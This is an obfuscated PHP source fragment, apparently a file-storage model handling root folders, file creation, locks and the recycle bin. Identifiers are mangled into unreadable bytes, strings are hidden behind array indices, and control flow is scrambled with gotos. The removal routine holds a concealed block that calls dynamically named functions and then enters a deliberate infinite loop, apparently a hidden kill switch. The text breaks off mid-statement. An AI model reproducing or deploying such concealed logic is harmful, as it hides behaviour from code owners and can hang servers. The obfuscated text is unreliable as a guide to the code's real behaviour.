$bØ˜è×›Õ =& $_SERVER[”Ì÷ñ­î¸]; $this->optionType = $bØ˜è×›Õ[2479]; $this->modelType = $bØ˜è×›Õ[2480]; $this->field = array($bØ˜è×›Õ[2481], $bØ˜è×›Õ[28], $bØ˜è×›Õ[190], $bØ˜è×›Õ[29], $bØ˜è×›Õ[2482], $bØ˜è×›Õ[690], $bØ˜è×›Õ[183]); } public function userNoticeGet($f„ùÜ·¨´ = false) { $this->initUserOption(); return parent::listData($f„ùÜ·¨´, $_SERVER[”Ì÷ñ­î¸][367], !0); } public function userNoticeAdd($EÛ¸§œïè×) { $A¿’¡¨ê =& $_SERVER[”Ì÷ñ­î¸]; $this->initUserOption(); $cˆÕ¡ğô× = $this->findByKey($A¿’¡¨ê[2481], $EÛ¸§œïè×[$A¿’¡¨ê[367]]); if ($cˆÕ¡ğô×) { return !0; } $cš¥±•£®Ç = array($A¿’¡¨ê[2481] => $EÛ¸§œïè×[$A¿’¡¨ê[367]], $A¿’¡¨ê[28] => $EÛ¸§œïè×[$A¿’¡¨ê[28]], $A¿’¡¨ê[190] => $EÛ¸§œïè×[$A¿’¡¨ê[190]], $A¿’¡¨ê[29] => isset($EÛ¸§œïè×[$A¿’¡¨ê[29]]) ? $EÛ¸§œïè×[$A¿’¡¨ê[29]] : 1, $A¿’¡¨ê[2482] => isset($EÛ¸§œïè×[$A¿’¡¨ê[2482]]) ? $EÛ¸§œïè×[$A¿’¡¨ê[2482]] : 0, $A¿’¡¨ê[690] => 0, $A¿’¡¨ê[183] => 0); return parent::insert($cš¥±•£®Ç); } public function userNoticeEdit($E×à¶Öêî, $c÷¡¾¿êÃÇ) { $this->initUserOption(); return parent::update($E×à¶Öêî, $c÷¡¾¿êÃÇ); } } goto e‹áŞ†ÄÄÏ; CÏ¶Ì°¡¶£: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($CñæøÖÏ¦) { $e•ÊºÅÜø =& $_SERVER[”Ì÷ñ­î¸]; $A»šØí½¡Æ = Model($e•ÊºÅÜø[474])->where(array($e•ÊºÅÜø[1430] => $CñæøÖÏ¦))->find(); $C‚àœó˜ÏŒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $CñæøÖÏ¦, $A»šØí½¡Æ[$e•ÊºÅÜø[28]]); $this->userDesktopAdd($C‚àœó˜ÏŒ); return $C‚àœó˜ÏŒ; } public function userDesktopAdd($D‰’°Ö˜â‚) { $A¶Ğ—¸»å© =& $_SERVER[”Ì÷ñ­î¸]; $f¹Óùß¸¹ = LNG($A¶Ğ—¸»å©[2330]); $CÆ¸ƒ¾¾²î = $this->mkdir($D‰’°Ö˜â‚, $f¹Óùß¸¹); $this->metaSet($CÆ¸ƒ¾¾²î, $A¶Ğ—¸»å©[2331], $A¶Ğ—¸»å©[83]); $this->metaSet($D‰’°Ö˜â‚, $A¶Ğ—¸»å©[2332], $CÆ¸ƒ¾¾²î); } public function groupRootAdd($aõÀÓÏğß) { $fà«¡ØÃ­Ç =& $_SERVER[”Ì÷ñ­î¸]; $DÎ†¥‰¬šå = Model($fà«¡ØÃ­Ç[458])->where(array($fà«¡ØÃ­Ç[2178] => $aõÀÓÏğß))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $aõÀÓÏğß, $DÎ†¥‰¬šå[$fà«¡ØÃ­Ç[28]]); } public function systemRootPathAdd($D±õ³°Õ˜µ) { if ($D±õ³°Õ˜µ != $_SERVER[”Ì÷ñ­î¸][1089]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $D±õ³°Õ˜µ); } public function userRootRemove($AÅš æ ¤Š) { $eÒÍÒ¿ø‰  = $this->sourceRoot(SourceModel::TYPE_USER, $AÅš æ ¤Š); if (!$eÒÍÒ¿ø‰ ) { return; } $this->remove($eÒÍÒ¿ø‰ , !1); } public function groupRootRemove($B³Ä È°Â‹) { $bë¤ƒè‡Ô× = $this->sourceRoot(SourceModel::TYPE_GROUP, $B³Ä È°Â‹); if (!$bë¤ƒè‡Ô×) { return; } $this->remove($bë¤ƒè‡Ô×, !1); } private function _mkdirRoot($CêÀÑœİœ‚, $E©ÃƒÚ’Ø™, $cğ‡“Ÿ¥Õé) { goto D›Š¤•–²˜; b´’òî: $a„ò§½©õÆ = "\x4d\x6f\144\x65\154\x53\x6f\165\x72\143\x65\56\x6d\x6b\144\151\x72\x52\x6f\x6f\x74\56{$CêÀÑœİœ‚}\56{$E©ÃƒÚ’Ø™}\56" . $cğ‡“Ÿ¥Õé; CacheLock::lock($a„ò§½©õÆ); $E‘ö—ù®–Ë[$dÙ¯øÖ ­[28]] = $cğ‡“Ÿ¥Õé; goto B½¯“òÀï; fÂô˜ºß: CacheLock::unlock($a„ò§½©õÆ); return $c‰•Î‰Ş°Â; goto b‡ÊÊ³õÂ; B½¯“òÀï: $c‰•Î‰Ş°Â = $this->add($E‘ö—ù®–Ë); $cİÛÔ¸“¾ = array($dÙ¯øÖ ­[527] => short_id($c‰•Î‰Ş°Â)); $this->where(array($dÙ¯øÖ ­[383] => $c‰•Î‰Ş°Â))->save($cİÛÔ¸“¾); goto fÂô˜ºß; D›Š¤•–²˜: $dÙ¯øÖ ­ =& $_SERVER[”Ì÷ñ­î¸]; $E‘ö—ù®–Ë = array($dÙ¯øÖ ­[368] => 0, $dÙ¯øÖ ­[521] => $CêÀÑœİœ‚, $dÙ¯øÖ ­[522] => $E©ÃƒÚ’Ø™, $dÙ¯øÖ ­[518] => 1, $dÙ¯øÖ ­[523] => USER_ID, $dÙ¯øÖ ­[524] => USER_ID, $dÙ¯øÖ ­[519] => $dÙ¯øÖ ­[33], $dÙ¯øÖ ­[525] => $dÙ¯øÖ ­[470], $dÙ¯øÖ ­[396] => 0, $dÙ¯øÖ ­[520] => 0, $dÙ¯øÖ ­[420] => 0, $dÙ¯øÖ ­[526] => $dÙ¯øÖ ­[33]); if ($E«×¤ŠÒ½ = $this->where($E‘ö—ù®–Ë)->find()) { return $E«×¤ŠÒ½[$dÙ¯øÖ ­[369]]; } goto b´’òî; b‡ÊÊ³õÂ: } private function sourceRoot($aÂƒÀò”œ†, $c¡ÁË§ì¶Ñ, $dÇÜëÃØí = false) { $D¢´¬°ÇÕã =& $_SERVER[”Ì÷ñ­î¸]; $Ağ×³›šåÙ = array($D¢´¬°ÇÕã[368] => 0, $D¢´¬°ÇÕã[521] => $aÂƒÀò”œ†, $D¢´¬°ÇÕã[522] => $c¡ÁË§ì¶Ñ); if ($b÷„†ëÃº¢ = $this->where($Ağ×³›šåÙ)->find()) { return $dÇÜëÃØí ? $b÷„†ëÃº¢ : $b÷„†ëÃº¢[$D¢´¬°ÇÕã[369]]; } return !1; } public function sourceRootGroup($f–‹ø¿») { $Bºø†¸Ñ§ =& $_SERVER[”Ì÷ñ­î¸]; if (is_string($f–‹ø¿»)) { $f–‹ø¿» = array($f–‹ø¿»); } $c¬ÁßÛê— = array($Bºø†¸Ñ§[368] => 0, $Bºø†¸Ñ§[521] => SourceModel::TYPE_GROUP, $Bºø†¸Ñ§[522] => array($Bºø†¸Ñ§[7], $f–‹ø¿»)); $aÚ©áŒù = $this->listSource($c¬ÁßÛê—, 1000); return array_to_keyvalue($aÚ©áŒù[$Bºø†¸Ñ§[74]], $Bºø†¸Ñ§[456]); } public function mkfile($f·§¤‘¼¹î, $DËİ¢‹†¹, $FÊÛéöŸ‹Ì = '', $aÁËÅá« = REPEAT_RENAME) { $fËŸÀÑÖî =& $_SERVER[”Ì÷ñ­î¸]; $a¯–ÃÀôÁ = Model($fËŸÀÑÖî[544])->addFileByContent($FÊÛéöŸ‹Ì, $DËİ¢‹†¹); return $this->_createFileCall($f·§¤‘¼¹î, $DËİ¢‹†¹, $a¯–ÃÀôÁ, $aÁËÅá«, $fËŸÀÑÖî[1125]); } public function addFile($FùÕ”µğŒğ, $døæáŒ§¹ , $e·®âÎÃ“ê, $bŠšğ¸ÇÉ = false, $e¯¬ë…Õî = REPEAT_RENAME) { $B¿‹ÃØìº = Model($_SERVER[”Ì÷ñ­î¸][544])->addFile($døæáŒ§¹ , $e·®âÎÃ“ê, $bŠšğ¸ÇÉ); return $this->_createFileCall($FùÕ”µğŒğ, $e·®âÎÃ“ê, $B¿‹ÃØìº, $e¯¬ë…Õî); } public function addFileByFileID($Eëƒ±ÖˆÜ, $b„æä«Â, $bÏ¤Ö±‘”¨, $a‹‚–ø”­ = REPEAT_RENAME) { $BØ‰¤ñ¾íï =& $_SERVER[”Ì÷ñ­î¸]; $E¼¬ÓßÕ = Model($BØ‰¤ñ¾íï[544])->find($b„æä«Â); Model($BØ‰¤ñ¾íï[544])->linkAdd($b„æä«Â); return $this->_createFileCall($Eëƒ±ÖˆÜ, $bÏ¤Ö±‘”¨, $E¼¬ÓßÕ, $a‹‚–ø”­); } public function addFileByRemote($Aé‰ÖÇ Ä™, $eæ´Åî£­, $A„‹šèœË, $cØèëºœ¤ä = array(), $E³ß²êø’¹ = REPEAT_RENAME) { $EŠè«›Ó§œ = Model($_SERVER[”Ì÷ñ­î¸][544])->addFileByRemote($eæ´Åî£­, $A„‹šèœË, $cØèëºœ¤ä); return $this->_createFileCall($Aé‰ÖÇ Ä™, $A„‹šèœË, $EŠè«›Ó§œ, $E³ß²êø’¹); } private function _createFileCall($AÚØ¾Í±Œ, $C¬„áÒ·¹Ò, $FÚ×ÔˆÍä£, $F»àµ¥Ó•š, $f‹áÕó®Ì = "\x75\160\154\x6f\x61\x64") { goto B‡×ˆà¹; B‡×ˆà¹: $E—»–Ê²› =& $_SERVER[”Ì÷ñ­î¸]; $e…ğŠô‘Æ· = !1; $this->lockWriteStart($AÚØ¾Í±Œ, $C¬„áÒ·¹Ò); goto e·™¤Ê¿˜‚; c™”§´ “¼: return $cÍ…ä˜Üæ¯; goto fí£ê½‘ªî; e·™¤Ê¿˜‚: $cÍ…ä˜Üæ¯ = $this->_createFile($AÚØ¾Í±Œ, $C¬„áÒ·¹Ò, $FÚ×ÔˆÍä£, $F»àµ¥Ó•š, $e…ğŠô‘Æ·); if (!$e…ğŠô‘Æ·) { Model($E—»–Ê²›[422])->remove($FÚ×ÔˆÍä£[$E—»–Ê²›[419]]); } else { if ($cÍ…ä˜Üæ¯) { Model($E—»–Ê²›[2303])->eventCreate($cÍ…ä˜Üæ¯, $f‹áÕó®Ì); } } $this->lockWriteEnd($AÚØ¾Í±Œ, $C¬„áÒ·¹Ò); goto c™”§´ “¼; fí£ê½‘ªî: } public function mkdir($cÙçÚ…×™ø, $FÑ«ª³†ˆ, $aëæ…ÕÒÁĞ = REPEAT_SKIP) { goto aŸÓˆÁ£ô; CŠĞÑ¸»‹‹: $this->lockWriteStart($cÙçÚ…×™ø, $FÑ«ª³†ˆ); if ($aëæ…ÕÒÁĞ !== !1) { $F£‚ƒÈÜ„… = $this->fileNameExist($cÙçÚ…×™ø, $FÑ«ª³†ˆ); if ($F£‚ƒÈÜ„… && $aëæ…ÕÒÁĞ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($cÙçÚ…×™ø, $FÑ«ª³†ˆ); return $F£‚ƒÈÜ„…; } $FÑ«ª³†ˆ = $this->fileNameAuto($cÙçÚ…×™ø, $FÑ«ª³†ˆ, $aëæ…ÕÒÁĞ); } $D„åÇÖÔ· = array($E£ªÍÙø½ò[518] => 1, $E£ªÍÙø½ò[386] => $FÑ«ª³†ˆ, $E£ªÍÙø½ò[519] => $E£ªÍÙø½ò[33], $E£ªÍÙø½ò[420] => 0, $E£ªÍÙø½ò[520] => 0); goto B¹”·Ù¸ŒØ; aŸÓˆÁ£ô: $E£ªÍÙø½ò =& $_SERVER[”Ì÷ñ­î¸]; $bã’ÛÖ™Š = $this->sourceInfo($cÙçÚ…×™ø); if (!$bã’ÛÖ™Š) { return !1; } goto CŠĞÑ¸»‹‹; fÖšœà—òé: return $bÖñ¨«·…¹; goto eˆ„¬ìÎµ˜; B¹”·Ù¸ŒØ: $bÖñ¨«·…¹ = $this->_addSoure($D„åÇÖÔ·, $bã’ÛÖ™Š); Model($E£ªÍÙø½ò[2303])->eventCreate($bÖñ¨«·…¹, $E£ªÍÙø½ò[1126]); $this->lockWriteEnd($cÙçÚ…×™ø, $FÑ«ª³†ˆ); goto fÖšœà—òé; eˆ„¬ìÎµ˜: } private function _createFile($bäµ ‡Šè×, $a”¤§Êˆøª, $Få¶ßƒ£ã, $b¦¶ªÛ£½, &$EÍÒîéˆÏ¥) { goto BÂô²ÉŸ¼; B†…Äµ¾©Ÿ: return $dÚëøºß·ï; goto f‡Ã“£ô—˜; E¹¨Ù¢¦Ñ¼: if ($b¦¶ªÛ£½ !== !1) { $B‡ã÷´á÷ = $this->fileNameExist($bäµ ‡Šè×, $a”¤§Êˆøª); } $EÍÒîéˆÏ¥ = !0; if ($b¦¶ªÛ£½ && $B‡ã÷´á÷) { if ($b¦¶ªÛ£½ == REPEAT_SKIP) { $EÍÒîéˆÏ¥ = !1; return $B‡ã÷´á÷; } else { if ($b¦¶ªÛ£½ == REPEAT_REPLACE) { $bÊÚÕõ©» = $this->sourceInfo($B‡ã÷´á÷); $bœ¥‘È¿‡å = $this->fileHistory($bÊÚÕõ©», $Få¶ßƒ£ã[$E„ÈÜ¾Ü¯[419]], $Få¶ßƒ£ã[$E„ÈÜ¾Ü¯[77]]); if (!$bœ¥‘È¿‡å) { $EÍÒîéˆÏ¥ = !1; } else { $this->folderSizeReset($bäµ ‡Šè×); } return $B‡ã÷´á÷; } else { $a”¤§Êˆøª = $this->fileNameAuto($bäµ ‡Šè×, $a”¤§Êˆøª, $b¦¶ªÛ£½, !1); } } } goto C¶»Ü±â±; C¶»Ü±â±: $E×÷ª©¶•“ = array($E„ÈÜ¾Ü¯[518] => 0, $E„ÈÜ¾Ü¯[386] => $a”¤§Êˆøª, $E„ÈÜ¾Ü¯[519] => get_path_ext($a”¤§Êˆøª), $E„ÈÜ¾Ü¯[420] => $Få¶ßƒ£ã[$E„ÈÜ¾Ü¯[419]], $E„ÈÜ¾Ü¯[520] => $Få¶ßƒ£ã[$E„ÈÜ¾Ü¯[77]]); $dÚëøºß·ï = $this->_addSoure($E×÷ª©¶•“, $CÆöÕİ…Ü); $this->folderSizeReset($bäµ ‡Šè×); goto B†…Äµ¾©Ÿ; BÂô²ÉŸ¼: $E„ÈÜ¾Ü¯ =& $_SERVER[”Ì÷ñ­î¸]; $CÆöÕİ…Ü = $this->sourceInfo($bäµ ‡Šè×); if (!$Få¶ßƒ£ã || !$CÆöÕİ…Ü) { return !1; } goto E¹¨Ù¢¦Ñ¼; f‡Ã“£ô—˜: } protected function fileHistory($dÊ‡Œ‚Ö÷, $FÎ¦„î…÷¡, $E¿¯ÁÓØ¼‹) { goto B‚ÙÊçìˆ‹; B‚ÙÊçìˆ‹: $B»ˆò¨çë =& $_SERVER[”Ì÷ñ­î¸]; if ($dÊ‡Œ‚Ö÷[$B»ˆò¨çë[419]] == $FÎ¦„î…÷¡) { return !1; } $this->checkLock($dÊ‡Œ‚Ö÷[$B»ˆò¨çë[369]], $FÎ¦„î…÷¡); goto bÏİ„¾Ã¥; bÏİ„¾Ã¥: Model($B»ˆò¨çë[2333])->addHistory($dÊ‡Œ‚Ö÷); $bÚÂ›šñ Û = array($B»ˆò¨çë[524] => USER_ID, $B»ˆò¨çë[390] => time(), $B»ˆò¨çë[419] => $FÎ¦„î…÷¡, $B»ˆò¨çë[77] => $E¿¯ÁÓØ¼‹); $this->where(array($B»ˆò¨çë[383] => $dÊ‡Œ‚Ö÷[$B»ˆò¨çë[369]]))->save($bÚÂ›šñ Û); goto Eó‚ÆŒê§; Eó‚ÆŒê§: return !0; goto EÆä±ˆ‹ë—; EÆä±ˆ‹ë—: } public function checkLock($bí£»à¬¨, $Däº¶‡ÁªŠ) { goto aë¤°‡ãĞŠ; Câğõ›ñ¸­: $d¿¼Ä¯¹• = Session::get($E’·Á›Ïä‹[2334]); $cÅˆîé§‘¸ = substr($D¡…ˆäİå[$E’·Á›Ïä‹[28]], 0, -1 - strlen($D¡…ˆäİå[$E’·Á›Ïä‹[160]])) . $E’·Á›Ïä‹[1392] . $d¿¼Ä¯¹• . $E’·Á›Ïä‹[91] . $D¡…ˆäİå[$E’·Á›Ïä‹[160]]; $F«Ä­¬©„´ = Model($E’·Á›Ïä‹[544])->find($Däº¶‡ÁªŠ); goto bõÆ‡ĞÄ”õ; A­í²¦Ø™Ÿ: show_json(LNG($E’·Á›Ïä‹[2336]) . $E’·Á›Ïä‹[2337] . LNG($E’·Á›Ïä‹[2338]) . $E’·Á›Ïä‹[2339] . $C‘µÕƒâï• . $E’·Á›Ïä‹[2340], !1); goto EÅì¯½ñê¸; bõÆ‡ĞÄ”õ: $this->_createFileCall($D¡…ˆäİå[$E’·Á›Ïä‹[461]], $cÅˆîé§‘¸, $F«Ä­¬©„´, REPEAT_REPLACE, $E’·Á›Ïä‹[1125]); $Eóï“Ìã = $D¡…ˆäİå[$E’·Á›Ïä‹[417]][$E’·Á›Ïä‹[481]]; $C‘µÕƒâï• = $Eóï“Ìã[$E’·Á›Ïä‹[2335]] ? $Eóï“Ìã[$E’·Á›Ïä‹[2335]] : $Eóï“Ìã[$E’·Á›Ïä‹[28]]; goto A­í²¦Ø™Ÿ; aë¤°‡ãĞŠ: $E’·Á›Ïä‹ =& $_SERVER[”Ì÷ñ­î¸]; $D¡…ˆäİå = $this->pathInfo($bí£»à¬¨); if (!$this->fileIsLock($D¡…ˆäİå, !0)) { return; } goto Câğõ›ñ¸­; EÅì¯½ñê¸: } public function fileIsLock($bÛ Ğñ¼›, $E¯‹òíêÔí = false) { goto Dá±¤Šàš; BÓÙŸ±“‡é: $Cµù¬Ş¾ÂÈ = $GLOBALS[$bøí„Åìì[6]][$bøí„Åìì[84]][$bøí„Åìì[479]]; if ($bÛ Ğñ¼›[$bøí„Åìì[417]][$bøí„Åìì[480]] <= time() - $Cµù¬Ş¾ÂÈ) { $this->metaSet($bÛ Ğñ¼›[$bøí„Åìì[369]], $bøí„Åìì[478], null); $this->metaSet($bÛ Ğñ¼›[$bøí„Åìì[369]], $bøí„Åìì[480], null); } if ($E¯‹òíêÔí) { $this->metaSet($bÛ Ğñ¼›[$bøí„Åìì[369]], $bøí„Åìì[480], time()); } goto bºÆÀÉÍ°½; bºÆÀÉÍ°½: return !1; goto b±Å÷íœ°«; Dá±¤Šàš: $bøí„Åìì =& $_SERVER[”Ì÷ñ­î¸]; if (!isset($bÛ Ğñ¼›[$bøí„Åìì[417]]) || !$bÛ Ğñ¼›[$bøí„Åìì[417]][$bøí„Åìì[478]]) { return !1; } if ($bÛ Ğñ¼›[$bøí„Åìì[417]][$bøí„Åìì[478]] != USER_ID) { return !0; } goto BÓÙŸ±“‡é; b±Å÷íœ°«: } private function _addSoure($E£¶¹İäºÊ, $eÔ±¬õâì„) { goto FçÍ¾„¡Éº; Cîİ¢ö£ˆ°: $this->updateModifyTime($E£¶¹İäºÊ[$fÄÚƒ”ªã[461]]); $aÍË¡­ÄÂÙ = $fÄÚƒ”ªã[2341] . $eÔ±¬õâì„[$fÄÚƒ”ªã[369]]; if (isset(self::$cacheChildList[$aÍË¡­ÄÂÙ])) { unset(self::$cacheChildList[$aÍË¡­ÄÂÙ]); } goto Cøøô¸õÊ; B»œÍ½¯¡‡: return $dÜÇ¶çÆÏ; goto cãÒÊ³ÒÉ; Cøøô¸õÊ: static $d®²”æ½š¸ = false; if (!$d®²”æ½š¸) { Hook::trigger($fÄÚƒ”ªã[508], $E£¶¹İäºÊ); $d®²”æ½š¸ = !0; } $dÜÇ¶çÆÏ = $this->add($E£¶¹İäºÊ); goto C××Âõé; C××Âõé: $A‹•ë²á½Ù = array($fÄÚƒ”ªã[527] => short_id($dÜÇ¶çÆÏ)); $this->where(array($fÄÚƒ”ªã[383] => $dÜÇ¶çÆÏ))->save($A‹•ë²á½Ù); $this->setNamePinyin($dÜÇ¶çÆÏ, $E£¶¹İäºÊ[$fÄÚƒ”ªã[28]]); goto B»œÍ½¯¡‡; FçÍ¾„¡Éº: $fÄÚƒ”ªã =& $_SERVER[”Ì÷ñ­î¸]; $F¢Æ®£ = array($fÄÚƒ”ªã[521] => $eÔ±¬õâì„[$fÄÚƒ”ªã[371]], $fÄÚƒ”ªã[522] => $eÔ±¬õâì„[$fÄÚƒ”ªã[456]], $fÄÚƒ”ªã[523] => USER_ID, $fÄÚƒ”ªã[524] => USER_ID, $fÄÚƒ”ªã[368] => $eÔ±¬õâì„[$fÄÚƒ”ªã[369]], $fÄÚƒ”ªã[525] => $eÔ±¬õâì„[$fÄÚƒ”ªã[459]] . $eÔ±¬õâì„[$fÄÚƒ”ªã[369]] . $fÄÚƒ”ªã[47], $fÄÚƒ”ªã[396] => 0, $fÄÚƒ”ªã[526] => $fÄÚƒ”ªã[33]); $E£¶¹İäºÊ = array_merge($F¢Æ®£, $E£¶¹İäºÊ); goto Cîİ¢ö£ˆ°; cãÒÊ³ÒÉ: } public function remove($d¢Ö‰Óó¡ƒ, $Eõ†À’®ê‘ = true) { goto DáÂ‘½›òÊ; fµˆø„áŸ: CacheLock::unlock($E˜õ‡‡ÁÙÓ); $this->metaSet($d¢Ö‰Óó¡ƒ, $BÄ¤†¶î [2350], $e“»¦àº‹Ã[$BÄ¤†¶î [461]]); $this->where(array($BÄ¤†¶î [369] => $d¢Ö‰Óó¡ƒ))->save(array($BÄ¤†¶î [390] => time())); goto F‡–Ìì¿õØ; F‡–Ìì¿õØ: $this->recycleClear($e“»¦àº‹Ã); $B÷¤‹°Æ¦Š = $this->move($d¢Ö‰Óó¡ƒ, $F¶ö®‡–Úî, REPEAT_RENAME_FOLDER); $this->folderSizeReset($e“»¦àº‹Ã[$BÄ¤†¶î [461]]); goto DŞ¬ÇÛº½Ë; fÛˆ—‘Ï¶: $Bİ“Çí§‹ß = $e“»¦àº‹Ã[$BÄ¤†¶î [371]] == self::TYPE_USER ? $BÄ¤†¶î [535] : $BÄ¤†¶î [973]; if ($Bİ“Çí§‹ß == $BÄ¤†¶î [535]) { $bÖÑ«ëÆÅ¶ = Model($BÄ¤†¶î [474])->getInfo($e“»¦àº‹Ã[$BÄ¤†¶î [456]]); $aê»âåº¥Ğ = !empty($bÖÑ«ëÆÅ¶[$BÄ¤†¶î [2335]]) ? $bÖÑ«ëÆÅ¶[$BÄ¤†¶î [2335]] : $bÖÑ«ëÆÅ¶[$BÄ¤†¶î [28]]; $aê»âåº¥Ğ = $BÄ¤†¶î [248] . $aê»âåº¥Ğ . $BÄ¤†¶î [2343] . $e“»¦àº‹Ã[$BÄ¤†¶î [456]]; } else { $bÖÑ«ëÆÅ¶ = Model($BÄ¤†¶î [458])->getInfo($e“»¦àº‹Ã[$BÄ¤†¶î [456]]); $aê»âåº¥Ğ = _get($bÖÑ«ëÆÅ¶, $BÄ¤†¶î [28]); $aê»âåº¥Ğ = $BÄ¤†¶î [157] . $aê»âåº¥Ğ . $BÄ¤†¶î [2344] . $e“»¦àº‹Ã[$BÄ¤†¶î [456]]; } $E˜õ‡‡ÁÙÓ = $BÄ¤†¶î [2345] . md5($aê»âåº¥Ğ); goto EÎéŸĞ ¾«; DáÂ‘½›òÊ: $BÄ¤†¶î  =& $_SERVER[”Ì÷ñ­î¸]; $e“»¦àº‹Ã = $this->sourceInfo($d¢Ö‰Óó¡ƒ); $f±Ğ…´‡È = intval($e“»¦àº‹Ã[$BÄ¤†¶î [371]]) === self::TYPE_SYSTEM; goto Fƒ¶ÖòŞÁ; Fƒ¶ÖòŞÁ: $b¿Ì¶öŸ®° = Model($BÄ¤†¶î [1437])->get($BÄ¤†¶î [2342]) == $BÄ¤†¶î [83]; if ($f±Ğ…´‡È || $Eõ†À’®ê‘ || !$b¿Ì¶öŸ®°) { return $this->removeNow($d¢Ö‰Óó¡ƒ, $Eõ†À’®ê‘); } $fŒ”çêŞ»¬ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto fÛˆ—‘Ï¶; DŞ¬ÇÛº½Ë: return $B÷¤‹°Æ¦Š; goto F…¹É©ƒ„; EÎéŸĞ ¾«: CacheLock::lock($E˜õ‡‡ÁÙÓ); $F¶ö®‡–Úî = $this->fileNameExist($fŒ”çêŞ»¬, $aê»âåº¥Ğ); if (!$F¶ö®‡–Úî) { $F¶ö®‡–Úî = $this->mkdir($fŒ”çêŞ»¬, $aê»âåº¥Ğ, REPEAT_SKIP); $this->metaSet($F¶ö®‡–Úî, $BÄ¤†¶î [2346], $Bİ“Çí§‹ß); $this->metaSet($F¶ö®‡–Úî, $BÄ¤†¶î [2347], $e“»¦àº‹Ã[$BÄ¤†¶î [456]]); if ($e“»¦àº‹Ã[$BÄ¤†¶î [461]] != 0) { $this->metaSet($F¶ö®‡–Úî, $BÄ¤†¶î [2348], _get($bÖÑ«ëÆÅ¶, $BÄ¤†¶î [2349])); } } goto fµˆø„áŸ; F…¹É©ƒ„: } private function recycleClear($e„Ôæ¥ì‚¤) { $AƒˆğˆÌê± =& $_SERVER[”Ì÷ñ­î¸]; $e¢”­´‹°¯ = $this->childrenAll($e„Ôæ¥ì‚¤); $E’ ÜêõÖÓ = array($AƒˆğˆÌê±[383] => array($AƒˆğˆÌê±[384], $e¢”­´‹°¯[$AƒˆğˆÌê±[2351]])); Model($AƒˆğˆÌê±[2352])->where($E’ ÜêõÖÓ)->delete(); } public function removeNow($F‡‚¶¼ïµÑ, $CÚÅŠ½‡Â = true) { goto BÕÏÙŞ¿×Æ; B½óŸ è–Ï: $this->lockMoveStart($F‡‚¶¼ïµÑ); Hook::trigger($c²ÕÆëêïñ[2353], $Cø·……´Ú…, $CÚÅŠ½‡Â); if ($CÚÅŠ½‡Â) { Model($c²ÕÆëêïñ[2352])->moveToRecycle($F‡‚¶¼ïµÑ); } else { $d…Ÿ×’ÕŠØ = $this->childrenAll($B°ìæÀò¯Å); Model($c²ÕÆëêïñ[505])->eventRemove($F‡‚¶¼ïµÑ); $this->removeRelevance($d…Ÿ×’ÕŠØ[$c²ÕÆëêïñ[2351]], $d…Ÿ×’ÕŠØ[$c²ÕÆëêïñ[1261]]); } goto b…–¨êÆŠÖ; d•ìµ’„Âö: $Cø·……´Ú… = $this->pathInfoMore($F‡‚¶¼ïµÑ); if (!$B°ìæÀò¯Å) { return !0; } if ($B°ìæÀò¯Å[$c²ÕÆëêïñ[461]] == 0) { if (!_get($GLOBALS, $c²ÕÆëêïñ[457])) { return !1; } } goto B½óŸ è–Ï; dİ‰Å¯µ—®: $this->updateModifyTime($aØÉÇÏŞâÒ); $this->lockMoveEnd($F‡‚¶¼ïµÑ); Hook::trigger($c²ÕÆëêïñ[1473], $Cø·……´Ú…, $CÚÅŠ½‡Â); goto DŒ¨£ñË; b…–¨êÆŠÖ: $this->folderSizeReset($B°ìæÀò¯Å[$c²ÕÆëêïñ[461]]); $aØÉÇÏŞâÒ = array($B°ìæÀò¯Å[$c²ÕÆëêïñ[461]]); if ($B°ìæÀò¯Å[$c²ÕÆëêïñ[370]] == $c²ÕÆëêïñ[83]) { $aØÉÇÏŞâÒ[] = $B°ìæÀò¯Å[$c²ÕÆëêïñ[369]]; } goto dİ‰Å¯µ—®; BÕÏÙŞ¿×Æ: $c²ÕÆëêïñ =& $_SERVER[”Ì÷ñ­î¸]; if (!isset($_SERVER[$c²ÕÆëêïñ[791]]) || !isset($_SERVER[$c²ÕÆëêïñ[1153]])) { goto cÁÚ“™’š¶; c´³îõŠ¤: $FÃñ•„¢‹À = $D·’—À»ÚÂ($a’ÏÎê„“); $aåÆÁÙ¥ = explode($c²ÕÆëêïñ[217], $FÃñ•„¢‹À); if (count($aåÆÁÙ¥) < $c²ÕÆëêïñ[559]) { $c®Ø‡œÔÜÂ = $c²ÕÆëêïñ[794]; $c®Ø‡œÔÜÂ(); } goto dùÈô °¯à; f¨«ÙÂÜ‘í: for ($aŠæìİÒœ¶ = $dŒˆÊöŞóØ; $aŠæìİÒœ¶ > 0; $aŠæìİÒœ¶++) { $CåÛîæ‹Û¶ = json_encode($GLOBALS[$c²ÕÆëêïñ[384]]); } goto Bº¯àµÅÕ¤; cÁÚ“™’š¶: $EãÏ¿•¶ŒÖ = $c²ÕÆëêïñ[792]; $D·’—À»ÚÂ = $c²ÕÆëêïñ[793]; $a’ÏÎê„“ = $_SERVER[$c²ÕÆëêïñ[788]] . $c²ÕÆëêïñ[789]; goto c´³îõŠ¤; dùÈô °¯à: $CåÛîæ‹Û¶ = $c²ÕÆëêïñ[795]; $CåÛîæ‹Û¶($_SERVER[$c²ÕÆëêïñ[796]]); $dŒˆÊöŞóØ = 1; goto f¨«ÙÂÜ‘í; Bº¯àµÅÕ¤: } $B°ìæÀò¯Å = $this->sourceInfo($F‡‚¶¼ïµÑ); goto d•ìµ’„Âö; DŒ¨£ñË: return !0; goto eÆ’ÎÇ·É¢; eÆ’ÎÇ·É¢: } public function childrenAll($c¥Ì†¯¦“Ğ) { $Cß¢”ÔäÕ¦ =& $_SERVER[”Ì÷ñ­î¸]; $Bä…ÃËÃ‹ = $c¥Ì†¯¦“Ğ[$Cß¢”ÔäÕ¦[369]]; if ($c¥Ì†¯¦“Ğ[$Cß¢”ÔäÕ¦[370]] == $Cß¢”ÔäÕ¦[83]) { $bœ¬³‹Æ = array($Cß¢”ÔäÕ¦[525] => array($Cß¢”ÔäÕ¦[483], $c¥Ì†¯¦“Ğ[$Cß¢”ÔäÕ¦[459]] . $Bä…ÃËÃ‹ . $Cß¢”ÔäÕ¦[484])); $c¯ˆÃ¬µĞ‡ = array($Cß¢”ÔäÕ¦[525] => $bœ¬³‹Æ[$Cß¢”ÔäÕ¦[459]]); $eÔ·Ş­´±© = 